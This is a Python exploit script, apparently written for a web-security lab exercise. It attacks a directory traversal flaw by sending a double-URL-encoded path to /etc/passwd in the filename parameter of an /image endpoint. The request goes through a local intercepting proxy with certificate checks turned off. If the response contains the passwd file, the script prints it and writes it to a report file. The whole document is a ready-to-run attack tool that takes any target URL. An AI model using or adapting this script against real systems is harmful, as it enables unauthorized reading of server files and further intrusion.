import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = { 'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080' }

def directory_traversal_exploit(url):
    image_url = url + '/image?filename=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34'
    r = requests.get(image_url, verify=False, proxies=proxies)
    if "root:x" in r.text:
        print('(+) Exploit Successful! \n')
        print(r.text)

        # storing the exploited result in a report sheet
        with open("Directory_Traversal_Report.txt", "w") as report:
            report.write("(+) Exploit was successful!\n")
            report.write("(+) The following is the content of the /etc/passwd file:\n\n")
            report.write(r.text)

    else:
        print('(+) Exploit failed')
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print('(+) Usage %s <url' % sys.argv[0])
        print('(+) Example %s www.example.com' % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print('(+) Exploiting the directory traversal vulnerability via url encoding twice method \n')
    directory_traversal_exploit(url)

if __name__ == "__main__":
    main()
